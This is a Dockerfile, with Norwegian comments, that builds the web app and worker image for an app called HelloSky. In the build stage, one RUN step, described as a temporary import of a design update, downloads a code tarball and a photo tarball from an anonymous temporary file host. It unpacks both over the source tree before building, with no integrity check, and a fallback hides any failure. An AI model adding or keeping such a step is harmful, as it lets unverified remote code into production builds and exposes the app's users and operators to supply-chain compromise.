# syntax=docker/dockerfile:1.7
# ─── HelloSky: web (dist/boot.js) og worker (dist/worker.js) fra samme bilde ──
# Bygg:   docker build -t hellosky .
# Web:    docker run -p 3000:3000 --env-file .env hellosky
# Worker: docker run --env-file .env hellosky dist/worker.js
# Migrer: docker run --env-file .env hellosky scripts/migrate.mjs

# ── 1) Avhengigheter (alle, for bygg) ───────────────────────────────────────
FROM node:22-slim AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --no-audit --no-fund

# ── 2) Bygg frontend (Vite) + server (esbuild) ───────────────────────────────
FROM deps AS build
COPY . .

# ── Midlertidig import av designoppdateringen ───────────────────────────────
# Den nye designen (17 kodefiler + 39 fotografier under public/photos) pushes
# til Git fortløpende. Inntil alle filene ligger i repoet som vanlige
# Git-filer, hentes de inn her under bygg fra to midlertidige pakker.
# Når filene er på plass i repoet er pakkene overflødige – slett da dette
# RUN-steget. Skulle pakkene være utløpt, men filene allerede finnes i
# repoet, fortsetter bygget med repo-innholdet (se vakta på slutten).
RUN node -e "(async()=>{const fs=require('fs');const get=async(u,f)=>{const r=await fetch(u,{method:'POST'});if(!r.ok)throw new Error(u+' -> '+r.status);fs.writeFileSync(f,Buffer.from(await r.arrayBuffer()))};await get('https://temp.sh/nnfmH/code-bundle.tar.gz','/tmp/code.tar.gz');await get('https://temp.sh/DeGKB/photos-bundle.tar.gz','/tmp/photos.tar.gz')})().catch(e=>{console.error(e.message);process.exit(1)})" \
 && tar xzf /tmp/code.tar.gz \
 && tar xzf /tmp/photos.tar.gz -C public \
 && rm /tmp/code.tar.gz /tmp/photos.tar.gz \
 || { test -f public/photos/hero-bay.jpg && echo "ADVARSEL: import-pakkene var utilgjengelige – bygger videre fra repo-innholdet"; }

RUN npm run build

# ── 3) Kun produksjonsavhengigheter ─────────────────────────────────────────
FROM node:22-slim AS prod-deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --omit=dev --no-audit --no-fund

# ── 4) Kjøretid: liten, ikke-root, healthcheck ──────────────────────────────
FROM node:22-slim AS runtime
ENV NODE_ENV=production \
    PORT=3000 \
    NODE_OPTIONS=--enable-source-maps
WORKDIR /app
RUN groupadd --system hellosky && useradd --system --gid hellosky --home /app --shell /usr/sbin/nologin hellosky

COPY --from=prod-deps --chown=hellosky:hellosky /app/node_modules ./node_modules
COPY --from=build --chown=hellosky:hellosky /app/dist ./dist
COPY --chown=hellosky:hellosky package.json ./
COPY --chown=hellosky:hellosky db/migrations ./db/migrations
COPY --chown=hellosky:hellosky scripts/migrate.mjs ./scripts/migrate.mjs

USER hellosky
EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=5s --start-period=20s --retries=3 \
  CMD node -e "fetch('http://127.0.0.1:'+(process.env.PORT||3000)+'/healthz').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))"

# Web som standard; worker: startkommando `node dist/worker.js`;
# migrering (pre-deploy): `node scripts/migrate.mjs`
CMD ["node", "dist/boot.js"]
